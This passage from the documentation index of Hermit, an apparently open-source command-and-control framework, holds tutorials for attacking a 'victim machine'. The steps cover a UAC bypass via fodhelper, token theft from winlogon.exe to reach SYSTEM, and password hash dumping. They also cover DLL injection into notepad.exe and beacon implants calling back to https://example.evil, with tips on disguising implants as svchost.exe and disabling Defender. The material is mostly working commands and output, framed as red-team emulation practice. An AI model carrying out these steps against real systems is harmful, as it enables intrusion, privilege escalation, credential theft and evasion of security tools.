Current Privileges","text":"<p>Because we want to compare the privileges before/after, check the current privileges with the following command at first:</p> Hermit C2 Server Console<pre><code>Hermit [agent-stephan] &gt; whoami --priv\n</code></pre> <p>This command prints the current privileges. After a few seconds, see the result:</p> Hermit C2 Server Console<pre><code>Hermit [agent-stephan] &gt; task results\n\n2024-05-13 09:53:55 : whoami priv\n=================================\nx SeShutdownPrivilege\no SeChangeNotifyPrivilege\nx SeUndockPrivilege\nx SeIncreaseWorkingSetPrivilege\nx SeTimeZonePrivilege\n</code></pre> <p>In most cases we should get the result similar to the above. However, these privielges are not enough for highly sensitive operations, so we want more higher authority.  </p> <p>Now escalate privilege.</p>"},{"location":"tutorials/privilege-escalation-with-implant-beacon/#3-uac-bypass","title":"3. UAC Bypass","text":"<p>Hermit has useful command (task) to bypass UAC, so we're going to use the method. Run the <code>uac</code> task on the C2 server console:</p> Hermit C2 Server Console<pre><code>Hermit [agent-stephan] &gt; uac\nTechnique: fodhelper\n</code></pre> <p>This task bypasses UAC by abusing <code>fodhelper.exe</code> and start another implant process. Wait until the task result will be callback, then check the result:</p> Hermit C2 Server Console<pre><code>Hermit [agent-stephan] &gt; task results\n\n2024-05-13 09:54:05 : uac --technique fodhelper\n===============================================\nSuccess: The fodhelper.exe and another process started successfully.\n</code></pre> <p>Okay, now the implant 'escalated' process has started. Exit the current agent mode and check another agent session (wait a few seconds until calback again):</p> Hermit C2 Server Console<pre><code>Hermit [agent-stephan] &gt; exit\nHermit &gt; agents\n[+]\nID  Name             IP           OS/Arch        Hostname         ListenerURL                 ImplantType  CheckIn              SessionID\n1   agent-stephan    172.20.32.1  windows/amd64  VICTIM-MACHINE   https://example.evil:56692  beacon       2024-05-13 09:53:17  Imh2EvmDAJOglBMJZjBddB1Dib5UyJt2\n2   agent-elizabeth  172.20.32.1  windows/amd64  VICTIM-MACHINE   https://example.evil:56692  beacon       2024-05-13 09:54:12  HHqvfKw8I5Lu4bzmH6MFknjKO7YFV3lG\n</code></pre> <p>We should see another agent listed as above. Switch to this newly agent mode:</p> Hermit C2 Server Console<pre><code>Hermit &gt; agent use 2\nHermit [agent-elizabeth] &gt;\n</code></pre> <p>Now check the privilege:</p> Hermit C2 Server Console<pre><code>Hermit [agent-elizabeth] &gt; whoami --priv\n\n# Wait until the result will be callback...\n\nHermit [agent-elizabeth] &gt; task results\n\n2024-05-13 09:54:41 : whoami priv\n=================================\nx SeIncreaseQuotaPrivilege\nx SeSecurityPrivilege\nx SeTakeOwnershipPrivilege\nx SeLoadDriverPrivilege\nx SeSystemProfilePrivilege\nx SeSystemtimePrivilege\nx SeProfileSingleProcessPrivilege\nx SeIncreaseBasePriorityPrivilege\nx SeCreatePagefilePrivilege\nx SeBackupPrivilege\nx SeRestorePrivilege\nx SeShutdownPrivilege\nx SeDebugPrivilege\nx SeSystemEnvironmentPrivilege\no SeChangeNotifyPrivilege\nx SeRemoteShutdownPrivilege\nx SeUndockPrivilege\nx SeManageVolumePrivilege\no SeImpersonatePrivilege\no SeCreateGlobalPrivilege\nx SeIncreaseWorkingSetPrivilege\nx SeTimeZonePrivilege\nx SeCreateSymbolicLinkPrivilege\nx SeDelegateSessionUserImpersonatePrivilege\n</code></pre> <p>You can see that the privileges have changed from the ones we initially checked. Sicne we have SeImpersonatePrivilege, we can abuse it for privilege escalation with Token Manipulation!</p>"},{"location":"tutorials/privilege-escalation-with-implant-beacon/#4-token-stealing","title":"4. Token Stealing","text":"<p>We're going to steal token and retrive the SYSTEM user account. Firstly, enumerate running proccesses and find a process which is available to our purpose so run the following command:</p> Hermit C2 Server Console<pre><code>Hermit [agent-elizabeth] &gt; ps ls\n\n# Wait until the result callback...\n\nHermit [agent-elizabeth] &gt; task results\n\n2024-05-13 10:13:23 : ps ls --exclude  --filter\n================================================\n PID    Name\n ---    ----\n 0\n 4      System\n 72     Registry\n 532    smss.exe\n 640    csrss.exe\n 736    wininit.exe\n 744    csrss.exe\n 792    winlogon.exe\n ...\n</code></pre> <p>In the result, we can use the <code>winlogon.exe</code> process (PID: 792). Then try stealing using this PID:</p> Hermit C2 Server Console<pre><code># -p 792: Set the target PID 792.\nHermit [agent-elizabeth] &gt; token steal -p 792\n\n# Wait until the result will be callback...\n\nHermit [agent-elizabeth] &gt; task results\n\n2024-05-13 10:14:32 : token steal --pid 792\n===============================================================================\nSuccess: Token has been stolen successfully.\n</code></pre> <p>If this task is succussful, another implant process will start again. Exit the current agent mode and see another agent session:</p> Hermit C2 Server Console<pre><code>Hermit [agent-elizabeth] &gt; exit\nHermit &gt; agents\n\n[+]\nID  Name             IP           OS/Arch        Hostname         ListenerURL                 ImplantType  CheckIn              SessionID\n1   agent-stephan    172.20.32.1  windows/amd64  VICTIM-MACHINE   https://example.evil:56692  beacon       2024-05-13 09:53:17  Imh2EvmDAJOglBMJZjBddB1Dib5UyJt2\n2   agent-elizabeth  172.20.32.1  windows/amd64  VICTIM-MACHINE   https://example.evil:56692  beacon       2024-05-13 09:54:12  HHqvfKw8I5Lu4bzmH6MFknjKO7YFV3lG\n3   agent-thomas     172.20.32.1  windows/amd64  VICTIM-MACHINE   https://example.evil:56692  beacon       2024-05-13 09:55:24  xe8dBGZkkQ1TZkcxJa3EC4U5SqOE0EfC\n</code></pre> <p>Now switch to the newly agent (ID: 3 here) with the following command:</p> Hermit C2 Server Console<pre><code>Hermit &gt; agent use 3\nHermit [agent-thomas] &gt;\n</code></pre> <p>Check current username and privileges with the following commands:</p> Hermit C2 Server Console<pre><code>Hermit [agent-thomas] &gt; whoami\nHermit [agent-thomas] &gt; whoami --priv\n</code></pre> <p>We should see that we're currently the SYSTEM user and have many privileges enabled as follow:</p> Hermit C2 Server Console<pre><code>Hermit [agent-thomas] &gt; task results\n\n2024-05-13 10:14:40 : whoami\n============================\nVICTIM-MACHINE\\SYSTEM\n\n2024-05-13 10:14:51 : whoami priv\n=================================\nx SeAssignPrimaryTokenPrivilege\nx SeIncreaseQuotaPrivilege\no SeTcbPrivilege\nx SeSecurityPrivilege\nx SeTakeOwnershipPrivilege\nx SeLoadDriverPrivilege\no SeProfileSingleProcessPrivilege\no SeIncreaseBasePriorityPrivilege\no SeCreatePermanentPrivilege\nx SeBackupPrivilege\nx SeRestorePrivilege\nx SeShutdownPrivilege\no SeDebugPrivilege\no SeAuditPrivilege\nx SeSystemEnvironmentPrivilege\no SeChangeNotifyPrivilege\nx SeUndockPrivilege\nx SeManageVolumePrivilege\no SeImpersonatePrivilege\no SeCreateGlobalPrivilege\nx SeTrustedCredManAccessPrivilege\n</code></pre>"},{"location":"tutorials/privilege-escalation-with-implant-beacon/#5-exfiltration-credential-dumping","title":"5. Exfiltration (Credential Dumping)","text":"<p>Now nothing is impossible for us because we're currently the SYSTEM user! So let's dump the credentials.  </p> <p>We use the <code>hashdump</code> task to dump hash passwords from registry hives. To do so simply run the following command:</p> Hermit C2 Server Console<pre><code>Hermit [agent-thomas] &gt; hashdump\n</code></pre> <p>After a few seconds, get the result:</p> Hermit C2 Server Console<pre><code>Hermit [agent-thomas] &gt; task results\n\n2024-05-13 10:15:48 : hashdump\n==============================\nAdministrator:500:abcdef0123456789abcdef0123456789:abcdef0123456789abcdef0123456789:::\nGuest:501:abcdef0123456789abcdef0123456789:abcdef0123456789abcdef0123456789:::\nDefaultAccount:503:abcdef0123456789abcdef0123456789:abcdef0123456789abcdef0123456789:::\nWDAGUtilityAccount:504:abcdef0123456789abcdef0123456789:abcdef0123456789abcdef0123456789:::\nVictim:1001:abcdef0123456789abcdef0123456789:abcdef0123456789abcdef0123456789:::\n\ndpapi_machinekey:0x0123456789abcdef0123456789abcdef01234567\ndpapi_userkey:0x0123456789abcdef0123456789abcdef01234567\n</code></pre> <p>We can use these hash passwords for Pass the Hash attack or we can crack them.  </p>"},{"location":"tutorials/simple-dll-injection/","title":"Simple DLL Injection","text":"<p>In this tutorial, we generate DLL Implant and Loader which loads the DLL into memory on Windows victim machine. Then make the C2 agent to communicate with our C2 server. </p> <p>Assume that you've completed the Simple Implant Beacon tutorial.  </p> <p>IMPORTANT: It's heavily recommended to use a virtual machine for Windows victim machine because If we modify the registry etc., the system might not work properly. Also we recommend temporarily turning off real-time protection of Windows Defender as it is likely to be detected by Windows Defender.</p>"},{"location":"tutorials/simple-dll-injection/#1-start-c2-server","title":"1. Start C2 Server","text":"<p>In the Hermit project root, start the C2 server:</p> <pre><code>./hermit\n</code></pre>"},{"location":"tutorials/simple-dll-injection/#2-start-https-listener","title":"2. Start HTTPS Listener","text":"<p>Once the C2 server started, we also need to start HTTPS listener:</p> Hermit C2 Server Console<pre><code>Hermit &gt; listener new\n</code></pre> <p>After starting, the listener folder is generated at <code>$HOME/.hermit/server/listeners/https-&lt;name&gt;</code>.</p>"},{"location":"tutorials/simple-dll-injection/#3-generate-dll-implant","title":"3. Generate DLL Implant","text":"<p>At first, generate an implant DLL with <code>payload gen</code> command.</p> <p></p> <p>In the settings wizard, choose the following options at least:</p> <ul> <li>What to generate? -&gt; <code>implant/beacon</code></li> <li>OS/Arch/Format    -&gt; <code>windows/amd64/dll</code></li> </ul>"},{"location":"tutorials/simple-dll-injection/#custom-domain-setting-optional","title":"Custom Domain Setting (Optional)","text":"<p>If we choose the domain for the listener URL such as <code>https://example.evil:12345</code> instead of the ip address such as <code>https://172.12.34.56:12345</code>, we need to add the domain to the <code>C:\\Windows\\System32\\drivers\\etc\\hosts</code> on the Windows victim machine for connecting back to our C2 server.</p>"},{"location":"tutorials/simple-dll-injection/#check-generated-payload","title":"Check Generated Payload","text":"<p>After that, we can see the generated payload with the <code>listener payloads &lt;LISTENER-ID&gt;</code> command:</p> <p></p> <p>This command lists all payloads hosted on the listener. We can freely delete arbitrary payload by selecting a payload on this menu (of course, we shouldn't delete it now).  </p> <p>This payload is stored under <code>$HOME/.hermit/server/listeners/https-&lt;name&gt;/payloads/</code>. The DLL loader that we will create later will find this DLL file in this directory and load it automatically, so don't move this payload.</p>"},{"location":"tutorials/simple-dll-injection/#4-generate-dll-loader","title":"4. Generate DLL Loader","text":"<p>Next, generate a DLL loader that loads the DLL implant and inject it on specific process. Run <code>payload gen</code> command again:</p> <p></p> <p>In the option wizard, choose the following options at least:</p> <ul> <li>What to generate?         -&gt; <code>loader/dll</code></li> <li>OS/Arch/Format            -&gt; <code>windows/amd64/exe</code></li> <li>Listener URL              -&gt; (Same URL as when generating the DLL)</li> <li>Technique                 -&gt; <code>dll-injection</code></li> <li>Target Process to Inject  -&gt; <code>notepad.exe</code></li> </ul> <p>This stager is also generated under <code>$HOME/.hermit/server/listeners/https-&lt;name&gt;/payloads/</code>. </p>"},{"location":"tutorials/simple-dll-injection/#transfer-the-loader","title":"Transfer the Loader","text":"<p>Now we need to transfer the generetad loader to Windows victim machine.</p>"},{"location":"tutorials/simple-dll-injection/#5-execute-loader","title":"5. Execute Loader","text":"<p>In Windows victime machine, at first, start <code>notepad.exe</code> as target process to inject our DLL into:</p> Windows Victim Machine<pre><code>PS C:\\Users\\victim\\Desktop&gt; notepad\n</code></pre> <p>That's because we've specified <code>notepad.exe</code> (by default) as target process in the previous Generate DLL Loader section. By doing so, our loader can inject the DLL into the <code>notepad</code> process.</p> <p>Finally we can execute the loader as below:</p> Windows Victim Machine<pre><code># Replace the filename with our own.\nPS C:\\Users\\victim\\Desktop&gt; .\\loader.exe\n</code></pre>"},{"location":"tutorials/simple-dll-injection/#6-switch-to-agent-mode","title":"6. Switch to Agent Mode","text":"<p>After a few seconds (10~30 seconds by default), we can see that the agent connected to our C2 server with <code>agents</code> command:</p> <p></p> <p>To enter the agent mode, run <code>agent use</code> command on C2 server console:</p> <p></p>"},{"location":"tutorials/simple-dll-injection/#7-send-tasks","title":"7. Send Tasks","text":"<p>In agent mode, we can send tasks and see results. Try <code>ps ls</code> task:  </p> Hermit C2 Server Console [Agent Mode]<pre><code>Hermit [agent-abcd] &gt; ps ls\n</code></pre> <p>This task prints all running processes on victim machine. </p> <p>After a few seconds, run the <code>task results</code> or <code>loot show</code> command to see the result:</p> Hermit C2 Server Console [Agent Mode]<pre><code>Hermit [agent-abcd] &gt; task results\nHermit [agent-abcd] &gt; loot show\n</code></pre> <p>If we cannot see the result yet, please repeat executing <code>loot show</code> command until the result will be shown.  </p> <p>Looking at the task result, we can see that our DLL implant is running on the <code>Notepad.exe</code> process as below:</p> <p></p> <p>That's because the loader injected the DLL into the <code>notepad.exe</code> process.</p>"},{"location":"tutorials/simple-dll-injection/#8-stop-implant-quit-agent-mode","title":"8. Stop Implant &amp; Quit Agent Mode","text":"<p>After playing the agent, stop the implant with the <code>kill</code> command or close the <code>Notepad</code>. Then run <code>exit</code> command to quit the agent mode.</p>"},{"location":"tutorials/simple-implant-beacon/","title":"Simple Implant Beacon","text":"<p>This page introduces the basic usage of execute the implant beacon on Windows victim machine.  </p> <p>Assume that you've already installed Hermit. If not yet, see the Installation page and try Getting Started.</p> <p>IMPORTANT: It's heavily recommended to use a virtual machine for Windows victim machine because If we modify the registry etc., the system might not work properly. Also we recommend temporarily turning off real-time protection of Windows Defender as it is likely to be detected by Windows Defender.</p>"},{"location":"tutorials/simple-implant-beacon/#1-start-c2-server","title":"1. Start C2 Server","text":"<p>Go to the Hermit project directory then run <code>./hermit</code> command.</p> <p></p> <p>In the server console, we can show usage with <code>help</code> or <code>help &lt;command&gt;</code>.</p>"},{"location":"tutorials/simple-implant-beacon/#2-start-https-listener","title":"2. Start HTTPS Listener","text":"Hermit C2 Server Console<pre><code>Hermit &gt; listener new\n</code></pre> <p>This command sets a new listener URL and run it. The IP is set from our local interface by default. The port number is randomly generated. If we want to specify our own IP/port, add <code>--url</code> flag:</p> Hermit C2 Server Console<pre><code>Hermit &gt; listener new --url https://127.0.0.1:1234\n</code></pre> <p>To list all listeners available, run <code>listeners</code> command.</p>"},{"location":"tutorials/simple-implant-beacon/#3-generate-implant-payload","title":"3. Generate Implant Payload","text":"<p><code>payload gen</code> command generates a new payload such as implant, loader, shellcode. The Wizard will start, so follow the instructions to complete the settings.</p> <p> </p> <p>It will take some time for generation (about 3-10 minutes. It depends on your machine spec). After that, the implant is saved under <code>$HOME/.hermit/server/listeners/https-&lt;name&gt;/payloads/</code> folder.  </p>"},{"location":"tutorials/simple-implant-beacon/#transfer-the-implant","title":"Transfer the Implant","text":"<p>Transfer the implant (<code>.exe</code>) to the Windows target computer. At that time, it's recommended to rename the filename because the word \"implant\" in the file name is too dignified. For example, rename it with \"chrome.exe\", \"svchost.exe\", etc.  </p>"},{"location":"tutorials/simple-implant-beacon/#custom-domain-setting-optional","title":"Custom Domain Setting (Optional)","text":"<p>If we choose the domain for the listener URL such as <code>https://example.evil:12345</code> instead of the ip address such as <code>https://172.12.34.56:12345</code>, we need to add the domain to the <code>C:\\Windows\\System32\\drivers\\etc\\hosts</code> on the Windows victim machine for connecting back to our C2 server.</p>"},{"location":"tutorials/simple-implant-beacon/#4-execute-implant","title":"4. Execute Implant","text":"<p>On the victim machine, execute the implant as below:  </p> Windows Victim Machine<pre><code># Replace the filename with our own.\n.\\implant.exe\n</code></pre>"},{"location":"tutorials/simple-implant-beacon/#5-switch-to-agent-mode","title":"5. Switch to Agent Mode","text":"<p>After a few seconds (10~30 seconds by default), the agent checked in and listed on the C2 server. We can check the agent listed with the <code>agents</code> command.</p> <p></p> <p>Now switch to Agent Mode by specifying the agent ID (e.g. <code>1</code>):</p> <p></p>"},{"location":"tutorials/simple-implant-beacon/#6-send-task-get-result","title":"6. Send Task &amp; Get Result","text":"<p>In Agent Mode, we can send tasks and get results. To see what tasks are available, run <code>?</code>, <code>help</code> or <code>help &lt;command&gt;</code> command. Currently, the following tasks are available:</p> Hermit C2 Server Console [Agent Mode]<pre><code>TASK:\n  assembly        Load and execute .NET assembly.\n  cat             Read contents of a file.\n  cd              Change the working directory.\n  cmd             Execute arbitrary system command.\n  connect         Change listener URL to connect.\n  cp              Copy a file.\n  creds steal     Steal credentials from various resources on the target computer\n  dll             Load DLL and inject modules into the specified process.\n  download        Download a file.\n  env ls          List environment variables.\n  envs            alias for 'env ls'\n  find            Find files.\n  group ls        List local groups.\n  groups          Alias for 'group ls'.\n  history         Retrieve information from history files of applications\n  ip              Print the network interface information on target computer\n  jitter          Set jitter time (seconds) between requests from beacon\n  keylog          Keylogging N seconds.\n  kill            Terminate the current process.\n  killdate        Change killdate (UTC) for the implant beacon.\n  ls              List files in a directory.\n  migrate         Migrate the implant into another process.\n  mkdir           Create a new directory.\n  mv              Move a file to a destination location.\n  net             Get TCP connections.\n  pe              Load and execute PE (Portable Executable) file.\n  persist         Establish persistence for implant.\n  procdump        Dump process memory to a specified output file.\n  ps kill         Terminate a process.\n  ps ls           List processes.\n  pwd             Print the current working directory.\n  reg query       Enumerate subkeys for the specified path.\n  rm              Remove a file.\n  rmdir           Remove a directory.\n  rportfwd add    Add settings to reverse port forwarding.\n  rportfwd ls     List settings for reverse port forwarding.\n  rportfwd rm     Stop and remove listener for reverse port forwarding.\n  runas           Execute a program as another user.\n  screenshot      Take a screenshot on target computer.\n  shellcode       Inject shellcode into the specified process.\n  sleep           Set sleep time (seconds) between requests from beacon.\n  token revert    Revert back to the original process token.\n  token steal     Steal token from the specified process and impersonate process.\n  uac             Bypass UAC and start another session.\n  upload          Upload a file to the target computer.\n  user ls         List users.\n  users           Alias for 'user ls'.\n  whoami          Print the current user information.\n</code></pre> <p>First, let's try sending the <code>whoami</code> task to the agent. This task retrieves the username on the victim machine.  </p> <p></p> <p>To see the tasks waiting for results, run the <code>tasks</code> command.  </p> <p>After a few seconds, if the task is successful, we can see the task results with the <code>task results</code> or <code>loot show</code> command:</p> Hermit C2 Server Console [Agent Mode]<pre><code>Hermit [agent-abcd] &gt; task results\n# or\nHermit [agent-abcd] &gt; loot show\n</code></pre> <p>Please try other tasks as well.</p>"},{"location":"tutorials/simple-implant-beacon/#7-stop-implant-quit-agent-mode","title":"7. Stop Implant &amp; Quit Agent Mode","text":"<p>After emulation, stop the implant with the <code>kill</code> command:</p> Hermit C2 Server Console [Agent Mode]<pre><code>Hermit [agent-abcd] &gt; kill\n</code></pre> <p>Then run <code>exit</code> command to quit the agent mode.</p>"},{"location":"tutorials/simple-implant-beacon/#8-delete-agent","title":"8. Delete Agent","text":"<p>If we want to delete the agent, run the following command:</p> Hermit C2 Server Console<pre><code>Hermit &gt; agent delete 1\n</code></pre> <p><code>1</code> is the agent ID that can be seen by <code>agents</code> command.</p>"},{"location":"tutorials/simple-implant-beacon/#9-stopdelete-listener","title":"9. Stop/Delete Listener","text":"<p>Also, if we want to stop and delete the listener, run the following command:</p> Hermit C2 Server Console<pre><code>Hermit &gt; listener stop 1\nHermit &gt; listener delete 1\n</code></pre> <p><code>1</code> is the listener ID that can be seen by <code>listeners</code> command.</p>"},{"location":"tutorials/simple-implant-beacon/#attack-further","title":"Attack Further...","text":"<p>If you'd like to escalate privilege, please try the Tutorial: Privilege Escalation with Implant Beacon.</p>"}]}